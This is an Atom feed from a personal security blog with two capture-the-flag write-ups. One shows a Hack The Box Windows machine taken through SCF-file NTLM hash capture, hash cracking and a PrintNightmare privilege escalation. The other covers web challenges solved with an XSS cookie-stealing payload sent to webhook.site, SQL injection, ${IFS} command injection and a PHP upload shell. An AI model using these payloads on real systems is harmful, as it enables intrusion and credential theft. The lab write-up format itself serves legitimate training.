<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/hackthebox/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2022-09-06T08:41:49+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/hackthebox/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">Driver Write Up</title>
      <link href="https://darrynbrownfield.co.uk/driver" rel="alternate" type="text/html" title="Driver Write Up" />
      <published>2022-02-27T00:00:00+00:00</published>
      <updated>2022-02-27T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/driver</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/driver">&lt;p&gt;&lt;img src=&quot;/assets/images/driver/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://app.hackthebox.com/machines/Driver&quot;&gt;Driver&lt;/a&gt; is a easy box from &lt;a href=&quot;https://hackthebox.com&quot;&gt;Hack The Box&lt;/a&gt;, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
Nmap scan report for 10.10.11.106
Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-28T00:20:49
|_  start_date: 2022-02-27T04:55:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;80 - HTTP - Microsoft IIS httpd 10.0&lt;/li&gt;
  &lt;li&gt;135 - MSRPC - Microsoft Windows RPC&lt;/li&gt;
  &lt;li&gt;445 - SMB - Microsoft Windows 7 - 10 microsoft-ds&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cme smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once logged in, I get a simple web page but an email address of ‘support@driver.htb’. I updated my host file with ‘driver.htb’ just in case I need it later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only link that works on the web page is ‘Firmware Updates’. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However re-reading the line:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I decided to change my google search to “http smb file share exploit” and found an article on using SCF files.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.14.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started responder with the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo responder -I tun0&lt;/code&gt;’.&lt;/p&gt;

&lt;p&gt;Then uploaded the file using the web upload function and got a hit from responder&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in to a file called ‘hash’ and used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now I had a username and password I was able to use winrm to login. To login I used &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    381      23     5164      14448 ...12            1128 spoolsv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To exploit this I used the &lt;a href=&quot;https://github.com/calebstewart/CVE-2021-1675&quot;&gt;exploit&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/calebjstewart&quot;&gt;Caleb Stewart&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/_JohnHammond&quot;&gt;John Hammond&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
┌─[daz@parrotos]─[/opt]
└──╼ $cd CVE-2021-1675
┌─[daz@parrotos]─[/opt/CVE-2021-1675]
└──╼ $ls
CVE-2021-1675.ps1  nightmare-dll  README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; exit

Info: Exiting with code 0

┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $/opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents&amp;gt; cd C:/Users/Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/26/2022   8:56 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">HTB Cyber Santa CTF 2021 Web Write Up</title>
      <link href="https://darrynbrownfield.co.uk/htbcybersanta" rel="alternate" type="text/html" title="HTB Cyber Santa CTF 2021 Web Write Up" />
      <published>2021-12-05T00:00:00+00:00</published>
      <updated>2021-12-05T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/htbcybersanta</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/htbcybersanta">&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;This writeup is for the web challenges from the &lt;a href=&quot;https://www.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.&lt;/p&gt;

&lt;p&gt;A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com.&lt;/p&gt;

&lt;h3 id=&quot;toy-workshop&quot;&gt;Toy Workshop&lt;/h3&gt;

&lt;p&gt;The description for this challenge was:&lt;/p&gt;

&lt;p&gt;“The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?”&lt;/p&gt;

&lt;p&gt;The challenge had both a docker instance to active and downloadable content.&lt;/p&gt;

&lt;p&gt;Taking a look at the docker instance IP we get a simple web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/workshop.gif&quot; alt=&quot;workshop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rather than spend time poking around the website I took a look at the code provided.&lt;/p&gt;

&lt;p&gt;In the routes/index.js file provides some additional paths, ‘/api/submit’ and ‘/queries’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;router.get('/', (req, res) =&amp;gt; {
	return res.render('index');
});

router.post('/api/submit', async (req, res) =&amp;gt; {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() =&amp;gt; {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) =&amp;gt; {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries =&amp;gt; {
			res.render('queries', { queries });
		})
		.catch(() =&amp;gt; res.status(500).send(response('Something went wrong!')));
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run ‘bot.readQueries(db);’. Next the /queries page is only accessible from 127.0.0.1.&lt;/p&gt;

&lt;p&gt;Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) =&amp;gt; {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;        &amp;lt;p class=&quot;pb-3&quot;&amp;gt;Welcome back, admin!&amp;lt;/p&amp;gt;
        &amp;lt;div class=&quot;dash-frame&quot;&amp;gt;
            
            &amp;lt;p&amp;gt;}&amp;lt;/p&amp;gt;
            
            &amp;lt;p class=&quot;empty&quot;&amp;gt;No content&amp;lt;/p&amp;gt;
            
        &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.&lt;/p&gt;

&lt;p&gt;First I tested sending a simple POST request using curl and got a response.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST http://:/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;test&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST :/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;&amp;gt;&amp;lt;script&amp;gt;window.location='\''https://webho
ok.site//?c='\''.concat(document.cookie)&amp;lt;/script&amp;gt;&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the webhook site was my request and the cookie.&lt;/p&gt;

&lt;h3 id=&quot;toy-management&quot;&gt;Toy Management&lt;/h3&gt;

&lt;p&gt;The description for Toy Management was:&lt;/p&gt;

&lt;p&gt;“The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?”&lt;/p&gt;

&lt;p&gt;Again with both a docker instance to start and downloadable content. This time its just a login form. I tried “admin’– -“ in the username field and “admin” as the password and got in and got the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/toymanagement.png&quot; alt=&quot;toymanagement&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gadget-santa&quot;&gt;Gadget Santa&lt;/h3&gt;

&lt;p&gt;The description for Gadget Santa was:&lt;/p&gt;

&lt;p&gt;“It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?”&lt;/p&gt;

&lt;p&gt;Again this challenge had both a docker instance and downloadable content.&lt;/p&gt;

&lt;p&gt;Looking at the webpage, I appears I can select options to print output from the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/gadgets.gif&quot; alt=&quot;gadgets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The URL has a command parameter: http://:/?command=list_storage&lt;/p&gt;

&lt;p&gt;So I tried some basic linux commands and I got output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commands.gif&quot; alt=&quot;commands&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, when ever I try and use a space I get no output. I can chain commands together using &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; but it still fails to show an output if I use a space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/listfiles.gif&quot; alt=&quot;listfiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source, there is a sanitize function which removes spaces from the command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this-&amp;gt;command = $this-&amp;gt;sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this-&amp;gt;command);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;def http_server(host_port,content_type=&quot;application/json&quot;):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -&amp;gt; None:
			def resp_ok():
				self.send_response(200)
				self.send_header(&quot;Content-type&quot;, content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;. &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces&quot;&gt;HackTricks&lt;/a&gt; is a great resource for techniques like this.&lt;/p&gt;

&lt;p&gt;So with the URL “http://:/?command=;curl${IFS}localhost:3000/get_flag” I get the flag!&lt;/p&gt;

&lt;h3 id=&quot;elf-directory&quot;&gt;Elf Directory&lt;/h3&gt;

&lt;p&gt;The description for Elf Directory was:&lt;/p&gt;

&lt;p&gt;“Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?”&lt;/p&gt;

&lt;p&gt;There is no downloadable content for this challenge just a docker instance to start.&lt;/p&gt;

&lt;p&gt;Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/elfdirectory.png&quot; alt=&quot;elfdirectory&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a message:&lt;/p&gt;

&lt;p&gt;“You don’t have permission to edit your profile, contact the admin elf to approve your account!”&lt;/p&gt;

&lt;p&gt;Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in &lt;a href=&quot;https://gchq.github.io&quot;&gt;CyberChef&lt;/a&gt; and used ‘From Base64’ operation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cookie.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I removed the %3D which left with me &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:false}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Next I changed the input to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:true}&lt;/code&gt; and used the ‘To Base64’. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: “eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D”&lt;/p&gt;

&lt;p&gt;Now refreshing the page with my new cookie I get the option to upload a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/approved.png&quot; alt=&quot;approved&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to upload a PHP file but got an error:&lt;/p&gt;

&lt;p&gt;“Invalid image. Only PNG images are supported.”&lt;/p&gt;

&lt;p&gt;So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/uploadbypass.gif&quot; alt=&quot;uploadbypass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now all I need to do is browse to the file and I will have command execution and can read the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commandinjection.gif&quot; alt=&quot;commandinjection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
